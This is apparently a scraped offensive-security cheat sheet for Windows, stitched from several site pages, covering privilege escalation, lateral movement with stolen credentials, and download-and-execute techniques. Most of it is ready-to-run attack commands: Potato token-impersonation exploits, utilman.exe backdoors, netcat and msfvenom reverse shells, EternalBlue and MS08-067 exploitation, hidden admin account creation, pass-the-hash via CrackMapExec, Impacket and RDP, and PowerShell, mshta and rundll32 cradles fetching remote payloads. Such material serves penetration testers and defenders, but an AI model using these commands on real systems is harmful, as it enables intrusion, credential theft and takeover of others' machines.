Microsoft.Workflow.Compiler.exe tests.xml results.xml EoP - Impersonation Privileges # Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.\nPrivilege Impact Tool Execution path Remarks SeAssignPrimaryToken Admin 3rd party tool \u0026ldquo;It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe\u0026rdquo; Thank you Aurélien Chalot for the update. I will try to re-phrase it to something more recipe-like soon. SeBackup Threat Built-in commands Read sensitve files with robocopy /b - May be more interesting if you can read %WINDIR%\\MEMORY.DMP\n- SeBackupPrivilege (and robocopy) is not helpful when it comes to open files.\n- Robocopy requires both SeBackup and SeRestore to work with /b parameter. SeCreateToken Admin 3rd party tool Create arbitrary token including local admin rights with NtCreateToken. SeDebug Admin PowerShell Duplicate the lsass.exe token. Script to be found at FuzzySecurity SeLoadDriver Admin 3rd party tool 1. Load buggy kernel driver such as szkg64.sys or capcom.sys\n2. Exploit the driver vulnerability\nAlternatively, the privilege may be used to unload security-related drivers with ftlMC builtin command. i.e.: fltMC sysmondrv 1. The szkg64 vulnerability is listed as CVE-2018-15732\n2. The szkg64 exploit code was created by Parvez Anwar SeRestore Admin PowerShell 1. Launch PowerShell/ISE with the SeRestore privilege present.\n2. Enable the privilege with Enable-SeRestorePrivilege).\n3. Rename utilman.exe to utilman.old\n4. Rename cmd.exe to utilman.exe\n5. Lock the console and press Win+U Attack may be detected by some AV software.\nAlternative method relies on replacing service binaries stored in \u0026ldquo;Program Files\u0026rdquo; using the same privilege. SeTakeOwnership Admin Built-in commands 1. takeown.exe /f \u0026quot;%windir%\\system32\u0026quot;\n2. icalcs.exe \u0026quot;%windir%\\system32\u0026quot; /grant \u0026quot;%username%\u0026quot;:F\n3. Rename cmd.exe to utilman.exe\n4. Lock the console and press Win+U Attack may be detected by some AV software.\nAlternative method relies on replacing service binaries stored in \u0026ldquo;Program Files\u0026rdquo; using the same privilege. SeTcb Admin 3rd party tool Manipulate tokens to have local admin rights included. May require SeImpersonate.\nTo be verified. Restore A Service Account\u0026rsquo;s Privileges # This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.\n# https://github.com/itm4n/FullPowers c:\\TOOLS\u0026gt;FullPowers [+] Started dummy thread with id 9976 [+] Successfully created scheduled task. [+] Got new token! Privilege count: 7 [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.19041.84] (c) 2019 Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u0026gt;whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======= SeAssignPrimaryTokenPrivilege Replace a process level token Enabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeAuditPrivilege Generate security audits Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled c:\\TOOLS\u0026gt;FullPowers -c \u0026#34;C:\\TOOLS\\nc64.exe 1.2.3.4 1337 -e cmd\u0026#34; -z Meterpreter getsystem and alternatives # meterpreter\u0026gt; getsystem Tokenvator.exe getsystem cmd.exe incognito.exe execute -c \u0026#34;NT AUTHORITY\\SYSTEM\u0026#34; cmd.exe psexec -s -i cmd.exe python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc RottenPotato (Token Impersonation) # Binary available at : https://github.com/foxglovesec/RottenPotato Binary available at : https://github.com/breenmachine/RottenPotatoNG getuid getprivs use incognito list\\_tokens -u cd c:\\temp\\ execute -Hc -f ./rot.exe impersonate\\_token \u0026#34;NT AUTHORITY\\SYSTEM\u0026#34; Invoke-TokenManipulation -ImpersonateUser -Username \u0026#34;lab\\domainadminuser\u0026#34; Invoke-TokenManipulation -ImpersonateUser -Username \u0026#34;NT AUTHORITY\\SYSTEM\u0026#34; Get-Process wininit | Invoke-TokenManipulation -CreateProcess \u0026#34;Powershell.exe -nop -exec bypass -c \\\u0026#34;IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.7.253.6:82/Invoke-PowerShellTcp.ps1\u0026#39;);\\\u0026#34;};\u0026#34; Juicy Potato (Abusing the golden privileges) # If the machine is \u0026gt;= Windows 10 1809 \u0026amp; Windows Server 2019 - Try Rogue Potato If the machine is \u0026lt; Windows 10 1809 \u0026lt; Windows Server 2019 - Try Juicy Potato\nBinary available at : https://github.com/ohpe/juicy-potato/releases Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication)\nwhoami /priv Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object\nWindows 7 Enterprise Windows 8.1 Enterprise Windows 10 Enterprise Windows 10 Professional Windows Server 2008 R2 Enterprise Windows Server 2012 Datacenter Windows Server 2016 Standard Execute JuicyPotato to run a privileged command.\nJuicyPotato.exe -l 9999 -p c:\\interpub\\wwwroot\\upload\\nc.exe -a \u0026#34;IP PORT -e cmd.exe\u0026#34; -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7} JuicyPotato.exe -l 1340 -p C:\\users\\User\\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334} JuicyPotato.exe -l 1337 -p c:\\Windows\\System32\\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a \u0026#34;/c c:\\users\\User\\reverse_shell.exe\u0026#34; Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337 ...... [+] authresult 0 {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK Rogue Potato (Fake OXID Resolver) # Binary available at https://github.com/antonioCoco/RoguePotato # Network redirector / port forwarder to run on your remote machine, must use port 135 as src port socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999 # RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. # Use this if you have fw restrictions. RoguePotato.exe -r 10.0.0.3 -e \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; # RoguePotato all in one with RogueOxidResolver running locally on port 9999 RoguePotato.exe -r 10.0.0.3 -e \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; -l 9999 #RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename RoguePotato.exe -r 10.0.0.3 -e \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; -l 9999 -c \u0026#34;{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}\u0026#34; -p splintercode EFSPotato (MS-EFSR EfsRpcOpenFileRaw) # Binary available at https://github.com/zcgonvh/EfsPotato # .NET 4.x csc EfsPotato.cs csc /platform:x86 EfsPotato.cs # .NET 2.0/3.5 C:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe EfsPotato.cs C:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe /platform:x86 EfsPotato.cs JuicyPotatoNG # antonioCoco/JuicyPotatoNG JuicyPotatoNG.exe -t * -p \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c whoami\u0026#34; \u0026gt; C:\\juicypotatong.txt EoP - Privileged File Write # DiagHub # :warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.\nThe Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM. This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the C:\\Windows\\System32 directory.\nExploit # Create an evil DLL e.g: payload.dll and move it into C:\\Windows\\System32 Build https://github.com/xct/diaghub diaghub.exe c:\\\\ProgramData\\\\ payload.dll The default payload will run C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 2000 -e cmd.exe\nAlternative tools:\nhttps://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag https://github.com/decoder-it/diaghub_exploit UsoDLLLoader # :warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.\nAn alternative to the DiagHub DLL loading \u0026ldquo;exploit\u0026rdquo; found by James Forshaw (a.k.a. @tiraniddo)\nIf we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of windowscoredeviceinfo.dll into C:\\Windows\\Sytem32\\ and then have it loaded by the USO service to get arbitrary code execution as NT AUTHORITY\\System.\nExploit # Build https://github.com/itm4n/UsoDllLoader Select Release config and x64 architecure. Build solution. DLL .\\x64\\Release\\WindowsCoreDeviceInfo.dll Loader .\\x64\\Release\\UsoDllLoader.exe. Copy WindowsCoreDeviceInfo.dll to C:\\Windows\\System32\\ Use the loader and wait for the shell or run usoclient StartInteractiveScan and connect to the bind shell on port 1337. WerTrigger # Weaponizing for privileged file writes bugs with Windows problem reporting\nClone https://github.com/sailay1996/WerTrigger Copy phoneinfo.dll to C:\\Windows\\System32\\ Place Report.wer file and WerTrigger.exe in a same directory. Then, run WerTrigger.exe. Enjoy a shell as NT AUTHORITY\\SYSTEM EoP - Common Vulnerabilities and Exposure # MS08-067 (NetAPI) # Check the vulnerability with the following nmap script.\nnmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 \u0026lt;ip_netblock\u0026gt; Metasploit modules to exploit MS08-067 NetAPI.\nexploit/windows/smb/ms08_067_netapi If you can\u0026rsquo;t use Metasploit and only want a reverse shell.\nhttps://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b \u0026#34;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026#34; -f py -v shellcode -a x86 --platform windows Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445 Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used) Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX) Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX) Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX) python ms08-067.py 10.0.0.1 6 445 MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7 # \u0026lsquo;KiTrap0D\u0026rsquo; User Mode to Ring Escalation (MS10-015)\nhttps://www.exploit-db.com/exploits/11199 Metasploit : exploit/windows/local/ms10_015_kitrap0d MS11-080 (afd.sys) - Microsoft Windows XP/2003 # Python: https://www.exploit-db.com/exploits/18176 Metasploit: exploit/windows/local/ms11_080_afdjoinleaf MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012 # printf(\u0026#34;[#] usage: ms15-051 command \\n\u0026#34;); printf(\u0026#34;[#] eg: ms15-051 \\\u0026#34;whoami /all\\\u0026#34; \\n\u0026#34;); # x32 https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe # x64 https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 use exploit/windows/local/ms15_051_client_copy_image MS16-032 - Microsoft Windows 7 \u0026lt; 10 / 2008 \u0026lt; 2012 R2 (x86/x64) # Check if the patch is installed : wmic qfe list | findstr \u0026quot;3139914\u0026quot;\nPowershell: https://www.exploit-db.com/exploits/39719/ https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1 Binary exe : https://github.com/Meatballs1/ms16-032 Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc MS17-010 (Eternal Blue) # Check the vulnerability with the following nmap script or crackmapexec: crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010.\nnmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 \u0026lt;ip_netblock\u0026gt; Metasploit modules to exploit EternalRomance/EternalSynergy/EternalChampion.\nauxiliary/admin/smb/ms17_010_command MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution auxiliary/scanner/smb/smb_ms17_010 MS17-010 SMB RCE Detection exploit/windows/smb/ms17_010_eternalblue MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ exploit/windows/smb/ms17_010_psexec MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution If you can\u0026rsquo;t use Metasploit and only want a reverse shell.\ngit clone https://github.com/helviojunior/MS17-010 # generate a simple reverse shell to use msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe python2 send_and_execute.py 10.0.0.1 revshell.exe CVE-2019-1388 # Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html\nRequirement:\nWindows 7 Windows 10 LTSC 10240 Failing on :\nLTSC 2019 1709 1803 Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege\nReferences # Windows Internals Book - 02/07/2017 icacls - Docs Microsoft Privilege Escalation Windows - Philip Linghammar Windows elevation of privileges - Guifre Ruiz The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte Basic Linux Privilege Escalation Windows Privilege Escalation Fundamentals TOP–10 ways to boost your privileges in Windows systems - hackmag The SYSTEM Challenge Windows Privilege Escalation Guide - absolomb\u0026rsquo;s security blog Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell Pentestlab.blog - WPE-01 - Stored Credentials Pentestlab.blog - WPE-02 - Windows Kernel Pentestlab.blog - WPE-03 - DLL Injection Pentestlab.blog - WPE-04 - Weak Service Permissions Pentestlab.blog - WPE-05 - DLL Hijacking Pentestlab.blog - WPE-06 - Hot Potato Pentestlab.blog - WPE-07 - Group Policy Preferences Pentestlab.blog - WPE-08 - Unquoted Service Path Pentestlab.blog - WPE-09 - Always Install Elevated Pentestlab.blog - WPE-10 - Token Manipulation Pentestlab.blog - WPE-11 - Secondary Logon Handle Pentestlab.blog - WPE-12 - Insecure Registry Permissions Pentestlab.blog - WPE-13 - Intel SYSRET Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @xpn Living Off The Land Binaries and Scripts (and now also Libraries) Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec Local Privilege Escalation Workshop - Slides.pdf - @sagishahar Abusing Diaghub - xct - March 07, 2019 Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018 Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019 Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows Abusing SeLoadDriverPrivilege for privilege escalation - 14 JUN 2018 - OSCAR MALLO Universal Privilege Escalation and Persistence – Printer - AUGUST 2, 2021) ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code "},{"id":12,"href":"/docs/windows_using_credentials/","title":"Windows - Using Credentials","section":"Docs","content":" Windows - Using credentials # TIPS # TIP 1 - Create your credential # net user hacker Hcker_12345678* /add /Y net localgroup administrators hacker /add net localgroup \u0026#34;Remote Desktop Users\u0026#34; hacker /add # RDP access net localgroup \u0026#34;Backup Operators\u0026#34; hacker /add # Full access to files net group \u0026#34;Domain Admins\u0026#34; hacker /add /domain # enable a domain user account net user hacker /ACTIVE:YES /domain # prevent users from changing their password net user username /Passwordchg:No # prevent the password to expire net user hacker /Expires:Never # create a machine account (not shown in net users) net user /add evilbob$ evilpassword # homoglyph Aԁmіnistratοr (different of Administrator) Aԁmіnistratοr Some info about your user\nnet user /dom net user /domain TIP 2 - Retail Credential # Retail Credential @m8urnett on Twitter\nwhen you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin\nUsername: RetailAdmin Password: trs10 TIP 3 - Sandbox Credential - WDAGUtilityAccount # WDAGUtilityAccount - @never_released on Twitter\nStarting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard\n\\\\windowssandbox Username: wdagutilityaccount Password: pw123 Metasploit # Metasploit - SMB # use auxiliary/scanner/smb/smb_login set SMBDomain DOMAIN set SMBUser username set SMBPass password services -p 445 -R run creds Metasploit - Psexec # Note: the password can be replaced by a hash to execute a pass the hash attack.\nuse exploit/windows/smb/psexec set RHOST 10.2.0.3 set SMBUser username set SMBPass password set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c set PAYLOAD windows/meterpreter/bind_tcp run shell Crackmapexec # root@payload$ git clone https://github.com/byt3bl33d3r/CrackMapExec.github root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#34;:5858d47a41e40b40f294b3100bea611f\u0026#34; -x \u0026#39;whoami\u0026#39; # cmd root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#34;:5858d47a41e40b40f294b3100bea611f\u0026#34; -X \u0026#39;whoami\u0026#39; # powershell root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#34;:5858d47a41e40b40f294b3100bea611f\u0026#34; --exec-method atexec -x \u0026#39;whoami\u0026#39; root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#34;:5858d47a41e40b40f294b3100bea611f\u0026#34; --exec-method wmiexec -x \u0026#39;whoami\u0026#39; root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#34;:5858d47a41e40b40f294b3100bea611f\u0026#34; --exec-method smbexec -x \u0026#39;whoami\u0026#39; Remote Code Execution with PS Credentials # PS C:\\\u0026gt; $SecPassword = ConvertTo-SecureString \u0026#39;secretpassword\u0026#39; -AsPlainText -Force PS C:\\\u0026gt; $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;DOMAIN\\USERNAME\u0026#39;, $SecPassword) PS C:\\\u0026gt; Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami} PS C:\\\u0026gt; New-PSSESSION -NAME PSDC -ComputerName COMPUTER01; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {whoami} PS C:\\\u0026gt; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri \u0026#39;http://10.10.10.10/beacon.exe\u0026#39; -OutFile \u0026#39;C:\\Temp\\beacon.exe\u0026#39;; Start-Process -wait C:\\Temp\\beacon.exe} WinRM # Require:\nPort 5985 or 5986 open. Default endpoint is /wsman root@payload$ git clone https://github.com/Hackplayers/evil-winrm root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] root@payload$ ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p \u0026#39;MySuperSecr3tPass123!\u0026#39; -s \u0026#39;/home/foo/ps1_scripts/\u0026#39; -e \u0026#39;/home/foo/exe_files/\u0026#39; root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -H BD1C6503987F8FF006296118F359FA79 root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -p password -r domain.local *Evil-WinRM* PS \u0026gt; Bypass-4MSI *Evil-WinRM* PS \u0026gt; IEX([Net.Webclient]::new().DownloadString(\u0026#34;http://127.0.0.1/PowerView.ps1\u0026#34;)) or using a custom ruby code to interact with the WinRM service.\nrequire \u0026#39;winrm\u0026#39; conn = WinRM::Connection.new( endpoint: \u0026#39;http://ip:5985/wsman\u0026#39;, user: \u0026#39;domain/user\u0026#39;, password: \u0026#39;password\u0026#39;, ) command=\u0026#34;\u0026#34; conn.shell(:powershell) do |shell| until command == \u0026#34;exit\\n\u0026#34; do print \u0026#34;PS \u0026gt; \u0026#34; command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \u0026#34;Exiting with code #{output.exitcode}\u0026#34; end Powershell Remoting # PSSESSION\nPS\u0026gt; Enable-PSRemoting # use credential PS\u0026gt; $pass = ConvertTo-SecureString \u0026#39;supersecurepassword\u0026#39; -AsPlainText -Force PS\u0026gt; $cred = New-Object System.Management.Automation.PSCredential (\u0026#39;DOMAIN\\Username\u0026#39;, $pass) PS\u0026gt; Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami } # one-to-one interactive session PS\u0026gt; Enter-PSSession -computerName DC01 [DC01]: PS\u0026gt; # one-to-one execute scripts and commands PS\u0026gt; $Session = New-PSSession -ComputerName CLIENT1 PS\u0026gt; Invoke-Command -Session $Session -scriptBlock { $test = 1 } PS\u0026gt; Invoke-Command -Session $Session -scriptBlock { $test } 1 # one-to-many execute scripts and commands PS\u0026gt; Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service } PS\u0026gt; Invoke-Command -computername DC01,CLIENT1 -filePath c:\\Scripts\\Task.ps1 Winexe # Integrated to Kali\nroot@payload$ winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe WMI # PS C:\\\u0026gt; wmic /node:target.domain /user:domain\\user /password:password process call create \u0026#34;C:\\Windows\\System32\\calc.exe” Psexec.py / Smbexec.py / Wmiexec.py # From Impacket (:warning: renamed to impacket-xxx in Kali) :warning: get / put for wmiexec, psexec, smbexec, and dcomexec are changing to lget and lput. :warning: French characters might not be correctly displayed on your output, use -codec ibm850 to fix this.\nroot@payload$ git clone https://github.com/CoreSecurity/impacket.git # PSEXEC like functionality example using RemComSv root@payload$ python psexec.py DOMAIN/username:password@10.10.10.10 # this will drop a binary on the disk = noisy # A similar approach to PSEXEC w/o using RemComSvc root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10 # A semi-interactive shell, used through Windows Management Instrumentation. root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10 root@payload$ wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79 # A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10 # Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. root@payload$ python dcomexec.py DOMAIN/username:password@10.10.10.10 PsExec - Sysinternal # from Windows - Sysinternal\nPS C:\\\u0026gt; PsExec.exe \\\\ordws01.cscou.lab -u DOMAIN\\username -p password cmd.exe # switch admin user to NT Authority/System PS C:\\\u0026gt; PsExec.exe \\\\ordws01.cscou.lab -u DOMAIN\\username -p password cmd.exe -s RDP Remote Desktop Protocol # :warning: NOTE: You may need to enable RDP and disable NLA and fix CredSSP errors.\n# Enable RDP PS C:\\\u0026gt; reg add \u0026#34;HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f PS C:\\\u0026gt; netsh firewall set service remoteadmin enable PS C:\\\u0026gt; netsh firewall set service remotedesktop enable # Alternative C:\\\u0026gt; psexec \\\\machinename reg add \u0026#34;hklm\\system\\currentcontrolset\\control\\terminal server\u0026#34; /f /v fDenyTSConnections /t REG_DWORD /d 0 root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable # Fix CredSSP errors reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026#34; /v UserAuthentication /t REG_DWORD /d 0 /f # Disable NLA PS \u0026gt; (Get-WmiObject -class \u0026#34;Win32_TSGeneralSetting\u0026#34; -Namespace root\\cimv2\\terminalservices -ComputerName \u0026#34;PC01\u0026#34; -Filter \u0026#34;TerminalName=\u0026#39;RDP-tcp\u0026#39;\u0026#34;).UserAuthenticationRequired PS \u0026gt; (Get-WmiObject -class \u0026#34;Win32_TSGeneralSetting\u0026#34; -Namespace root\\cimv2\\terminalservices -ComputerName \u0026#34;PC01\u0026#34; -Filter \u0026#34;TerminalName=\u0026#39;RDP-tcp\u0026#39;\u0026#34;).SetUserAuthenticationRequired(0) Abuse RDP protocol to execute commands remotely with the following commands;\nrdesktop root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare root@payload$ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10 # -g : the screen will take up 70% of your actual screen size # -r disk:share : sharing a local folder during a remote desktop session freerdp root@payload$ xfreerdp /v:10.0.0.1 /u:\u0026#39;Username\u0026#39; /p:\u0026#39;Password123!\u0026#39; +clipboard /cert-ignore /size:1366x768 /smart-sizing root@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked # pass the hash using Restricted Admin, need an admin account not in the \u0026#34;Remote Desktop Users\u0026#34; group. # pass the hash works for Server 2012 R2 / Win 8.1+ # require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11 root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d SharpRDP PS C:\\\u0026gt; SharpRDP.exe computername=target.domain command=\u0026#34;C:\\Temp\\file.exe\u0026#34; username=domain\\user password=password Netuse # Windows only\nPS C:\\\u0026gt; net use \\\\ordws01.cscou.lab /user:DOMAIN\\username password C$ Runas # PS C:\\\u0026gt; runas /netonly /user:DOMAIN\\username \u0026#34;cmd.exe\u0026#34; PS C:\\\u0026gt; runas /noprofil /netonly /user:DOMAIN\\username cmd.exe Pass the Ticket # python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user [*] Saving ticket in user.ccache cp user.ccache /tmp/krb5cc_0 export KRB5CCNAME=/tmp/krb5cc_0 klist SSH # :warning: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!)\ncp user.ccache /tmp/krb5cc_1045 ssh -o GSSAPIAuthentication=yes user@domain.local -vv References # Ropnop - Using credentials to own Windows boxes Ropnop - Using credentials to own Windows boxes Part 2 Gaining Domain Admin from Outside Active Directory "},{"id":13,"href":"/docs/windows_download_and_execute/","title":"Windows Download and Execute Methods","section":"Docs","content":" Windows - Download and execute methods # Downloaded files location # C:\\Users\u0026lt;username\u0026gt;\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\ C:\\Users\u0026lt;username\u0026gt;\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\u0026lt;subdir\u0026gt; C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV Powershell # From an HTTP server\npowershell -exec bypass -c \u0026#34;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(\u0026#39;http://webserver/payload.ps1\u0026#39;)|iex\u0026#34; # Download only (New-Object System.Net.WebClient).DownloadFile(\u0026#34;http://10.10.10.10/PowerUp.ps1\u0026#34;, \u0026#34;C:\\Windows\\Temp\\PowerUp.ps1\u0026#34;) Invoke-WebRequest \u0026#34;http://10.10.10.10/binary.exe\u0026#34; -OutFile \u0026#34;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\u0026#34; # Download and run Rubeus, with arguments $data = (New-Object System.Net.WebClient).DownloadData(\u0026#39;http://10.10.10.10/Rubeus.exe\u0026#39;) $assem = [System.Reflection.Assembly]::Load($data) [Rubeus.Program]::Main(\u0026#34;s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\u0026#34;.Split()) # Execute a specific method from an assembly $data = (New-Object System.Net.WebClient).DownloadData(\u0026#39;http://10.10.10.10/lib.dll\u0026#39;) $assem = [System.Reflection.Assembly]::Load($data) $class = $assem.GetType(\u0026#34;ClassLibrary1.Class1\u0026#34;) $method = $class.GetMethod(\u0026#34;runner\u0026#34;) $method.Invoke(0, $null) From a Webdav server\npowershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 Cmd # cmd.exe /k \u0026lt; \\\\webdavserver\\folder\\batchfile.txt Cscript / Wscript # cscript //E:jscript \\\\webdavserver\\folder\\payload.txt Mshta # mshta vbscript:Close(Execute(\u0026#34;GetObject(\u0026#34;\u0026#34;script:http://webserver/payload.sct\u0026#34;\u0026#34;)\u0026#34;)) mshta http://webserver/payload.hta mshta \\\\webdavserver\\folder\\payload.hta Rundll32 # rundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint rundll32.exe javascript:\u0026#34;\\..\\mshtml,RunHTMLApplication\u0026#34;;o=GetObject(\u0026#34;script:http://webserver/payload.sct\u0026#34;);window.close(); Regasm / Regsvc @subTee # 